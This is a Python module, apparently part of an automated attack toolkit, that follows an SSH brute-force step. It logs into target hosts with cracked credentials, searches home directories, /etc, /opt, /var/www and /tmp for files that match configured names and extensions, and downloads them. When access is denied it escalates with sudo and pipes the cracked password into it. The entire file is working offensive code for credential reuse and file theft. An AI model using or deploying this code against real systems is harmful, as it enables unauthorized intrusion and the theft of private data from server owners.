"""
steal_files_ssh.py - This script connects to remote SSH servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import paramiko
import logging
import time
import json
import shlex
from rich.console import Console
from threading import Timer
from shared import SharedData
from logger import Logger
from actions.connector_utils import FileTracker

# Configure the logger
logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesSSH"
b_module = "steal_files_ssh"
b_status = "steal_files_ssh"
b_parent = "SSHBruteforce"
b_port = 22

class StealFilesSSH:
    """
    Class to handle the process of stealing files from SSH servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.sftp_connected = False
            self.stop_execution = False
            self.b_parent_action = b_parent  # Set the parent action attribute
            self.file_tracker = FileTracker('ssh', self.shared_data.datadir)
            logger.info("StealFilesSSH initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_ssh(self, ip, username, password):
        """
        Establish an SSH connection.
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)
            logger.info(f"Connected to {ip} via SSH with username {username}")
            return ssh
        except Exception as e:
            logger.error(f"Error connecting to SSH on {ip} with username {username}: {e}")
            raise

    def find_files(self, ssh, dir_path):
        """
        Find files in the remote directory based on the configuration criteria.
        Limited to specific depth and file size to avoid downloading entire directories.
        """
        try:
            # Limit search depth to avoid going too deep into directory structure
            max_depth = 3
            max_file_size = 10 * 1024 * 1024  # 10MB limit per file
            max_total_files = 50  # Maximum number of files to steal
            
            # Build a more targeted find command with size and depth limits
            find_cmd = (
                f'find {dir_path} -maxdepth {max_depth} -type f '
                f'-size -{max_file_size}c 2>/dev/null | head -200'
            )
            
            logger.info(f"Searching for files in {dir_path} (max depth: {max_depth}, max size: {max_file_size/1024/1024}MB)")
            stdin, stdout, stderr = ssh.exec_command(find_cmd)
            files = stdout.read().decode().splitlines()
            
            matching_files = []
            ext_match_count = 0
            name_match_count = 0
            sample_matches = []
            sample_non_matches = []

            for file in files:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("File search interrupted.")
                    return []
                
                # Stop if we have enough files
                if len(matching_files) >= max_total_files:
                    logger.info(f"Reached maximum file limit ({max_total_files}), stopping search")
                    break

                # Check file extension matches
                ext_match = any(file.lower().endswith(ext.lower()) for ext in self.shared_data.steal_file_extensions)
                
                # Check filename matches (more specific - must contain the exact name)
                name_match = any(file_name.lower() in os.path.basename(file).lower() for file_name in self.shared_data.steal_file_names)
                
                # Skip common system/log files that might match extensions
                skip_patterns = [
                    '/var/log/', '/proc/', '/sys/', '/dev/', '/tmp/systemd-',
                    '/run/', '/.cache/', '/snap/', '/boot/', '/lib/',
                    '/usr/share/', '/usr/lib/', '/etc/systemd/'
                ]
                
                if any(pattern in file for pattern in skip_patterns):
                    continue

                if ext_match or name_match:
                    # Additional validation - check if file looks interesting
                    basename = os.path.basename(file)
                    
                    # Skip very generic config files unless specifically named
                    if ext_match and not name_match:
                        # Skip files that are likely system configs
                        generic_names = ['default', 'common', 'main', 'base', 'system', 'global']
                        if any(generic in basename.lower() for generic in generic_names) and len(basename) < 15:
                            continue
                    
                    matching_files.append(file)
                    if ext_match:
                        ext_match_count += 1
                    if name_match:
                        name_match_count += 1
                    if len(sample_matches) < 5:
                        reasons = []
                        if ext_match:
                            reasons.append("extension")
                        if name_match:
                            reasons.append("name")
                        sample_matches.append(f"{file} ({'/'.join(reasons)})")
                elif len(sample_non_matches) < 3:  # Reduced sample size
                    sample_non_matches.append(file)

            display_dir = dir_path if dir_path == '/' else dir_path.rstrip('/') + '/'
            logger.info(
                f"Found {len(matching_files)} matching files in {display_dir} "
                f"(scanned {len(files)}, extension matches {ext_match_count}, name matches {name_match_count})"
            )
            if sample_matches:
                logger.info(f"Sample matched files: {'; '.join(sample_matches)}")
            elif sample_non_matches:
                logger.debug(f"Sample scanned files (no match): {'; '.join(sample_non_matches[:3])}")
            
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            raise

    @staticmethod
    def _get_remote_home(ssh, username):
        """Return the remote home directory for the authenticated user."""
        try:
            stdin, stdout, stderr = ssh.exec_command('echo -n $HOME')
            home = stdout.read().decode().strip()
            if home:
                return home
        except Exception as e:
            logger.warning(f"Unable to determine $HOME via environment: {e}")

        # Fallback to common convention
        fallback_home = f"/home/{username}" if username not in {'root', ''} else '/root'
        logger.debug(f"Falling back to home directory guess: {fallback_home}")
        return fallback_home

    def _download_with_privileged_cat(self, ssh, remote_file, local_file_path, password):
        """Attempt to read remote files via shell (cat/sudo) when SFTP lacks rights."""
        remote_quoted = shlex.quote(remote_file)
        attempts = [(f"cat {remote_quoted}", False), (f"sudo -n cat {remote_quoted}", False)]

        if password:
            attempts.append((f"sudo -S cat {remote_quoted}", True))

        for command, needs_password in attempts:
            try:
                stdin, stdout, stderr = ssh.exec_command(command, get_pty=needs_password)
                if needs_password:
                    stdin.write(f"{password}\n")
                    stdin.flush()

                data = stdout.read()
                exit_status = stdout.channel.recv_exit_status()
                error_output = stderr.read().decode().strip()

                if exit_status == 0 and data:
                    os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
                    with open(local_file_path, 'wb') as local_file:
                        local_file.write(data)
                    logger.info(f"Downloaded {remote_file} using shell command '{command}'")
                    return True

                logger.debug(
                    f"Shell command '{command}' failed for {remote_file} (exit {exit_status}): {error_output or 'no stderr'}"
                )
            except Exception as fallback_error:
                logger.debug(f"Shell fallback '{command}' errored for {remote_file}: {fallback_error}")

        return False

    def steal_file(self, ssh, remote_file, local_dir, ip, username=None, password=None):
        """
        Download a file from the remote server to the local directory.
        Includes size checking and progress logging.
        Optimization: Skip files that have already been downloaded.
        """
        sftp = None
        try:
            # Check if file was already stolen
            if self.file_tracker.is_file_stolen(ip, remote_file):
                logger.debug(f"Skipping {remote_file}: already stolen from {ip}")
                return False
            
            sftp = ssh.open_sftp()
            self.sftp_connected = True  # Mark SFTP as connected
            
            # Check file size before downloading
            try:
                file_stat = sftp.stat(remote_file)
                file_size = file_stat.st_size
                max_size = 10 * 1024 * 1024  # 10MB limit
                
                if file_size > max_size:
                    logger.warning(f"Skipping {remote_file}: file too large ({file_size/1024/1024:.1f}MB > {max_size/1024/1024}MB)")
                    sftp.close()
                    return False
                    
                logger.info(f"Downloading {os.path.basename(remote_file)} ({file_size/1024:.1f}KB)")
            except Exception as stat_error:
                logger.warning(f"Could not get file size for {remote_file}: {stat_error}")
            
            remote_dir = os.path.dirname(remote_file)
            local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
            os.makedirs(local_file_dir, exist_ok=True)
            local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
            
            downloaded_via_sftp = False
            fallback_required = False

            try:
                sftp.get(remote_file, local_file_path)
                downloaded_via_sftp = True
            except (PermissionError, OSError, IOError) as download_error:
                if getattr(download_error, 'errno', None) == 13 or 'Permission denied' in str(download_error):
                    fallback_required = True
                    logger.warning(
                        f"Permission denied fetching {remote_file} via SFTP. Attempting privileged fallback."
                    )
                else:
                    raise

            if sftp:
                sftp.close()
                sftp = None

            if not downloaded_via_sftp and fallback_required:
                downloaded_via_sftp = self._download_with_privileged_cat(
                    ssh,
                    remote_file,
                    local_file_path,
                    password
                )
                if not downloaded_via_sftp:
                    logger.error(f"Fallback download also failed for {remote_file}")
                    return False

            if downloaded_via_sftp:
                logger.success(f"Downloaded {remote_file} -> {local_file_path}")
                self.file_tracker.mark_file_stolen(ip, remote_file)
                return True
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")
            try:
                if sftp:
                    sftp.close()
            except:
                pass
            return False

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using SSH.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.ragnarorch_status = "StealFilesSSH"
                # Wait a bit because it's too fast to see the status change
                time.sleep(5)
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get SSH credentials from the cracked passwords file
                sshfile = self.shared_data.sshfile
                credentials = []
                if os.path.exists(sshfile):
                    with open(sshfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def timeout():
                    """
                    Timeout function to stop the execution if no SFTP connection is established.
                    """
                    if not self.sftp_connected:
                        logger.error(f"No SFTP connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.start()

                # Attempt to steal files using each credential
                success = False
                total_downloaded = 0
                
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("File search interrupted.")
                        break
                    try:
                        logger.info(f"Trying credential {username} for {ip}")
                        ssh = self.connect_ssh(ip, username, password)
                        
                        # Search in multiple targeted directories instead of just home
                        search_dirs = [
                            self._get_remote_home(ssh, username),
                            '/etc',
                            '/opt',
                            '/var/www',
                            '/tmp'
                        ]
                        
                        mac = row['MAC Address']
                        local_dir = os.path.join(self.shared_data.datastolendir, f"ssh/{mac}_{ip}")
                        
                        all_remote_files = []
                        
                        for search_dir in search_dirs:
                            if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                logger.info("File search interrupted.")
                                break
                                
                            logger.info(f"Searching in {search_dir} on {ip}")
                            try:
                                remote_files = self.find_files(ssh, search_dir)
                                all_remote_files.extend(remote_files)
                                logger.info(f"Found {len(remote_files)} files in {search_dir}")
                            except Exception as dir_error:
                                logger.warning(f"Could not search {search_dir}: {dir_error}")
                                continue
                        
                        # Remove duplicates
                        all_remote_files = list(set(all_remote_files))
                        
                        if all_remote_files:
                            # Filter out already stolen files
                            new_files, already_stolen_count = self.file_tracker.filter_new_files(ip, all_remote_files)
                            
                            if already_stolen_count > 0:
                                logger.info(f"Skipping {already_stolen_count} already stolen files, {len(new_files)} new files to download")
                            else:
                                logger.info(f"Total unique files found: {len(all_remote_files)} (all new)")
                            
                            downloaded_count = 0
                            
                            for remote_file in new_files:
                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                    logger.info("File download interrupted.")
                                    break
                                    
                                if self.steal_file(ssh, remote_file, local_dir, ip, username, password):
                                    downloaded_count += 1
                                    total_downloaded += 1
                                    
                                # Progress update every 10 files
                                if downloaded_count % 10 == 0 and downloaded_count > 0:
                                    logger.info(f"Downloaded {downloaded_count}/{len(new_files)} new files so far...")
                            
                            if downloaded_count > 0:
                                success = True
                                logger.success(f"Successfully downloaded {downloaded_count} new files from {ip} using {username}")
                            elif already_stolen_count > 0:
                                # All files were already stolen
                                success = True
                                logger.info(f"No new files to download from {ip} - all {already_stolen_count} files already stolen")
                            else:
                                logger.warning(f"No files could be downloaded from {ip} using {username}")
                        else:
                            logger.warning(f"No matching files found on {ip} using {username}")
                            
                        ssh.close()
                        
                        if success:
                            timer.cancel()  # Cancel the timer if the operation is successful
                            return 'success'  # Return success if the operation is successful
                            
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with username {username}: {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ssh = StealFilesSSH(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
